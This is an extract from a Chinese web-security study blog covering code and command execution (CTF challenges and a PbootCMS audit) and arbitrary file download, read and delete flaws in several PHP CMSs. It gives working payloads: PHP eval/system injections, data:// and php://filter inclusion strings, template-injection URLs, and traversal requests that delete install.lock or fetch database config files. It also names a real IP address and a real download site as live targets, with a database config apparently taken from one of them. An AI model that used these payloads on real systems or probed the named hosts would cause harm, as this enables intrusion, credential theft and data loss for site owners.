src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201182052825.png" alt="image-20230201182052825"></p><p>解法一：echo shell_exec(‘tac fla*.ph*’);</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201182235961.png" alt="image-20230201182235961"></p><p>解法二：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`cp fla*.ph* 2.txt`</span><br></pre></td></tr></table></figure><p>(把flag.php复制到2.txt，再访问2.txt同样效果)</p><h6 id="31-参数逃逸"><a href="#31-参数逃逸" class="headerlink" title="31-参数逃逸"></a>31-参数逃逸</h6><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201182847606.png" alt="image-20230201182847606"></p><p>eval($_GET[1]);&amp;1&#x3D;system(‘tac flag.php’);&#x2F;&#x2F;构建一个新的参数逃逸过滤</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201183039977.png" alt="image-20230201183039977"></p><h6 id="32-36-配合包含-amp-伪协议"><a href="#32-36-配合包含-amp-伪协议" class="headerlink" title="32~36-配合包含&amp;伪协议"></a>32~36-配合包含&amp;伪协议</h6><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201183152369.png" alt="image-20230201183152369"></p><p>include$_GET[a]?&gt;&amp;a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<code>&lt;?=system(&#39;tac flag.php&#39;);?&gt;</code></p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201183527298.png" alt="image-20230201183527298"></p><p>用php协议:include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201183952839.png" alt="image-20230201183952839"></p><h6 id="37-39-包含-amp-伪协议-amp-通配符"><a href="#37-39-包含-amp-伪协议-amp-通配符" class="headerlink" title="37~39-包含&amp;伪协议&amp;通配符"></a>37~39-包含&amp;伪协议&amp;通配符</h6><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201184217562.png" alt="image-20230201184217562"></p><p>data:&#x2F;&#x2F;text&#x2F;plain,<?=system('tac fla*');?></p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201184358529.png" alt="image-20230201184358529"></p><p>php:&#x2F;&#x2F;input post:<?php system('tac flag.php');?></p><h4 id="代码审计-PbootCMS-RCE代码执行"><a href="#代码审计-PbootCMS-RCE代码执行" class="headerlink" title="#代码审计-PbootCMS-RCE代码执行"></a>#代码审计-PbootCMS-RCE代码执行</h4><blockquote><p>靶场：PbootCMS</p><p>流程：搜索特定函数-&gt;parserIfLabel-&gt;parserCommom-&gt;About&amp;Content-&gt;构造</p><p>AboutController：{pboot:if(eval($_POST[1]))}!!!{&#x2F;pboot:if}</p><p>ContentController：&#x2F;index.php&#x2F;Content&#x2F;2?keyword&#x3D;{pboot:if(eval($_REQUEST[1]));&#x2F;&#x2F;)})}}{&#x2F;pboot:if}&amp;1&#x3D;phpinfo();</p></blockquote><p>这个漏洞目前找到5处，新版本和老版本不同的是新版本加了过滤，但是可以绕过，漏洞函数在ParserController.php里。在2330多行这里，parserIfLabel()方法中调用了eval函数。而且前面有过滤。先忽略过滤内容，一会回来看，看下哪里调用了parserfLabel方法。</p><p>找到了parserIfLabel()方法，而且从下面可以看到在ParserController.php中parserAfter()方法调用了parserIfLabel()方法。</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/v2-68fa290adfcb378cae6cb3153e294e11_r.jpg" alt="img"></p><p>打开，找到函数右键全文追踪：</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202160332177.png" alt="image-20230202160332177"></p><p>找到调用parserIflabel()的是parserCommon()方法:</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202161230831.png" alt="image-20230202161230831"></p><p>所以谁调用了parserCommon()，谁就会触发parserIflabel()，全局搜索parserCommon()被谁调用,搜索后发现五处:（举例3处）</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202161505479.png" alt="image-20230202161505479"></p><p><strong>1、index处：</strong></p><p>验证下是否可以控制前端输出，以Index试一下，可以看到已经可以控制前端输出，说明存在漏洞:</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/v2-529c75a220fb17244f12f9259f995222_1440w.webp" alt="img"></p><p>构造payload：</p><p><a href="http://127.0.0.1/PbootCMS/index.php/index/index?keyword=%7Bpboot:if(1)$a=$_GET%5Bb%5D;$a();;//)%7D)%7D%7D%7B/pboot:if%7D&b=phpinfo()">http://127.0.0.1/PbootCMS/index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a();;//)})}}{/pboot:if}&amp;b=phpinfo()</a>;</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202162413935.png" alt="image-20230202162413935"></p><p><strong>2、about留言处：（需要后台审核）</strong></p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202163621935.png" alt="image-20230202163621935"></p><p>将代码echo出来</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202163759128.png" alt="image-20230202163759128"></p><p>显示变量1可控</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202163650254.png" alt="image-20230202163650254"></p><p>然后</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202163913648.png" alt="image-20230202163913648"></p><p><strong>3、content处：</strong></p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230202165246027.png" alt="image-20230202165246027"></p><h4 id="层面-探针-语言-amp-CMS框架-amp-中间件"><a href="#层面-探针-语言-amp-CMS框架-amp-中间件" class="headerlink" title="#层面-探针-语言&amp;CMS框架&amp;中间件"></a>#层面-探针-语言&amp;CMS框架&amp;中间件</h4><p><a href="http://vulfocus.io/">http://vulfocus.io/ </a> Shiro weblogic</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、RCE执行-代码执行&amp;amp;命令执行&lt;/p&gt;
&lt;p&gt;2、CTF考点-漏洞配合&amp;amp;绕过手法&lt;/p&gt;
&lt;p&gt;3、</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day43 WEB攻防-通用漏洞&amp;任意文件下载&amp;删除重装&amp;敏感读取&amp;黑白审计</title>
    <link href="http://example.com/2023/01/31/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2023/01/31/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/</id>
    <published>2023-01-31T09:00:25.000Z</published>
    <updated>2023-02-01T09:03:43.029Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、文件操作类安全问题</p><p>2、文件下载&amp;删除&amp;读取</p><p>3、白盒&amp;黑盒&amp;探针分析</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><p>文件读取：基本和文件下载利用类似</p><p>文件下载：利用下载获取源码或数据库配置文件及系统敏感文件为后续出思路</p><p>文件删除：除自身安全引发的文件删除外，可配合删除重装锁定文件进行重装</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 审计分析-文件下载-XHCMS-功能点</p><p>➢ 审计分析-文件读取-MetInfo-函数搜索</p><p>➢ 审计分析-文件删除-74CMS-函数搜索</p><p>➢ 黑盒分析-下载读取-下载资源URL参数</p><h4 id="白盒审计："><a href="#白盒审计：" class="headerlink" title="#白盒审计："></a>#白盒审计：</h4><h5 id="1、文件下载"><a href="#1、文件下载" class="headerlink" title="1、文件下载"></a>1、文件下载</h5><p>流程-功能点抓包-寻代码文件-寻变量控制-构造测试</p><p>Payload: softadd&#x3D;d:&#x2F;1.txt softadd2&#x3D;d:&#x2F;1.txt</p><h5 id="2、文件删除：74CMS-配合删除重装"><a href="#2、文件删除：74CMS-配合删除重装" class="headerlink" title="2、文件删除：74CMS-配合删除重装"></a>2、文件删除：74CMS-配合删除重装</h5><p>流程-特定函数搜索-寻触发调用-构造Payload测试</p><p>Payload: &#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;..&#x2F;..&#x2F;data&#x2F;install.lock</p><h5 id="3、文件读取：MetInfo-任意读取"><a href="#3、文件读取：MetInfo-任意读取" class="headerlink" title="3、文件读取：MetInfo-任意读取"></a>3、文件读取：MetInfo-任意读取</h5><p>流程-特定函数搜索-寻触发调用-构造Payload测试</p><p>Payload：&#x2F;include&#x2F;thumb.php?dir&#x3D;http....\config\config_db.php</p><h4 id="黑盒探针"><a href="#黑盒探针" class="headerlink" title="#黑盒探针"></a>#黑盒探针</h4><h5 id="1、URL参数名及参数值分析："><a href="#1、URL参数名及参数值分析：" class="headerlink" title="1、URL参数名及参数值分析："></a>1、URL参数名及参数值分析：</h5><p>参数名：英文对应翻译</p><p>参数值：目录或文件名</p><h5 id="2、功能点自行修改后分析："><a href="#2、功能点自行修改后分析：" class="headerlink" title="2、功能点自行修改后分析："></a>2、功能点自行修改后分析：</h5><p>文件下载，删除，读取等</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h5 id="➢-审计分析-文件下载-XHCMS-功能点"><a href="#➢-审计分析-文件下载-XHCMS-功能点" class="headerlink" title="➢ 审计分析-文件下载-XHCMS-功能点"></a>➢ 审计分析-文件下载-XHCMS-功能点</h5><p>判断下载文件能不能控制</p><p>数据库查询过来-&gt;$down[‘softadd’];-&gt;$fileadd-&gt;$sourceFile下载文件变量</p><h5 id="➢-审计分析-文件读取-MetInfo-函数搜索"><a href="#➢-审计分析-文件读取-MetInfo-函数搜索" class="headerlink" title="➢ 审计分析-文件读取-MetInfo-函数搜索"></a>➢ 审计分析-文件读取-MetInfo-函数搜索</h5><p>流程-特定函数搜索-寻触发调用-构造Payload测试</p><p>搜索一些文件读取的函数：cnblogs.com&#x2F;gyrgyr&#x2F;p&#x2F;5774436.html</p><p>1.fread  2.fgets  3.fgetss   4.file   5.readfile   6.file_get_contents   7.fpassthru</p><p>通过查找函数readfile找到这个路径下的readfile</p><p>靶场：Metlnfo6.0.0</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201150457805.png" alt="image-20230201150457805"></p><p>找到控制读取文件的变量$dir</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201150628834.png" alt="image-20230201150628834"></p><p>查找$dir从哪里来，全局搜索$dir</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201150944356.png" alt="image-20230201150944356"></p><p>然后看谁调用了这个文件的对象class old_thumb全局搜索</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201151034843.png" alt="image-20230201151034843"></p><p>找到位置：</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201151102971.png" alt="image-20230201151102971"></p><p>访问Payload：&#x2F;include&#x2F;thumb.php?dir&#x3D;http....\config\config_db.php读取到数据库配置文件</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201151735482.png" alt="image-20230201151735482"></p><p>访问要加http&#x2F;是因为代码中的需求：</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201154936491.png" alt="image-20230201154936491"></p><h5 id="➢-审计分析-文件删除-74CMS-函数搜索"><a href="#➢-审计分析-文件删除-74CMS-函数搜索" class="headerlink" title="➢ 审计分析-文件删除-74CMS-函数搜索"></a>➢ 审计分析-文件删除-74CMS-函数搜索</h5><p>靶场：74cms3.4</p><p>全局搜索php文件删除函数unlink</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201161448482.png" alt="image-20230201161448482"></p><p>进入admin_article.php发现只有act&#x3D;del_img时才会触发删除，这里的$upfiles，$thumb_dir和$img都没有写死，可以控制</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201161625063.png" alt="image-20230201161625063"></p><p>追踪$thumb_dir发现其是固定目录的变量，确定它是删除在data下的再下一级(变量updor_thumb)的文件(两个目录)</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201163035375.png" alt="image-20230201163035375"></p><p>所以如果想删除根目录下的1.txt，则构造payload: &#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;..&#x2F;..&#x2F;1.txt(从变量updor_thumb的目录跳到data，再data往上到根目录)</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201162809665.png" alt="image-20230201162809665"></p><p>删除成功！</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201163612582.png" alt="image-20230201163612582"></p><p>若要删除安装文件data下的install.lock </p><p>Payload: &#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;..&#x2F;..&#x2F;data&#x2F;install.lock</p><p>Payload: &#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;..&#x2F;install.lock也可以，因为一个..&#x2F;就返回到了data目录下，..&#x2F;..&#x2F;data&#x2F;install.lock只是第二个..&#x2F;从data返回到根目录，后面接&#x2F;data是又回到data目录下</p><h5 id="➢-黑盒分析-下载读取-下载资源URL参数（真实环境）"><a href="#➢-黑盒分析-下载读取-下载资源URL参数（真实环境）" class="headerlink" title="➢ 黑盒分析-下载读取-下载资源URL参数（真实环境）"></a>➢ 黑盒分析-下载读取-下载资源URL参数（真实环境）</h5><blockquote><p>下载文件URL</p><p>没有安全问题：</p><p><a href="http://www.xiaodi8.com/soft/2.zip">www.xiaodi8.com/soft/2.zip</a> 直连下载</p><p><a href="http://www.xiaodi8.com/soft/index.php">www.xiaodi8.com/soft/index.php</a></p><p>可能安全问题</p><p><a href="http://www.xiaodi8.com/down?file=1.zip">www.xiaodi8.com/down?file=1.zip</a></p><p>代码用下载协议去解析文件</p><p><a href="http://www.xiaodi8.com/down?file=index.php">www.xiaodi8.com/down?file=index.php</a></p></blockquote><p>1、网站：<a href="http://67.202.70.133/files/readfile.php?file=">http://67.202.70.133/files/readfile.php?file=</a></p><p>访问：<a href="http://67.202.70.133/files/readfile.php?file=index.php%E6%84%8F%E6%80%9D%E6%98%AF%E4%B8%8B%E8%BD%BDfiles%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84index.php%E6%B2%A1%E6%9C%89%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C%E9%A6%96%E9%A1%B5%E6%96%87%E4%BB%B6%E5%9C%A8%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%92%8Cfiles%E5%90%8C%E7%BA%A7%EF%BC%8C%E6%89%80%E4%BB%A5%E8%A6%81%E8%AE%BF%E9%97%AE%EF%BC%9Ahttp://67.202.70.133/files/readfile.php?file=../index.php%E6%89%8D%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BD%E5%88%B0">http://67.202.70.133/files/readfile.php?file=index.php意思是下载files目录下的index.php没有这个文件，首页文件在根目录下和files同级，所以要访问：http://67.202.70.133/files/readfile.php?file=../index.php才可以下载到</a></p><p>下载后打开发现很多包含文件，都可以下载，或者直接找到这套程序的cms：Joomla，在网上查找其数据库文件的路径发现是：..&#x2F;configuration.php</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201143505961.png" alt="image-20230201143505961"></p><p>所以访问<a href="http://67.202.70.133/files/readfile.php?file=../configuration.php%E5%B0%B1%E4%B8%8B%E8%BD%BD%E5%88%B0%E4%BA%86%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6">http://67.202.70.133/files/readfile.php?file=../configuration.php就下载到了数据库文件</a></p><p>2、网站：<a href="http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMzAxMDMvZGJrZ3l5XzEuOS4yX2RhbmdiZWkuYXBr">http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMzAxMDMvZGJrZ3l5XzEuOS4yX2RhbmdiZWkuYXBr</a></p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201143250340.png" alt="image-20230201143250340"></p><p>此处的&#x2F;down&#x2F;20211229是从根目录开始的，所以下载index.php直接前面加&#x2F;就可以了</p>]]></content>
    
    
      
      
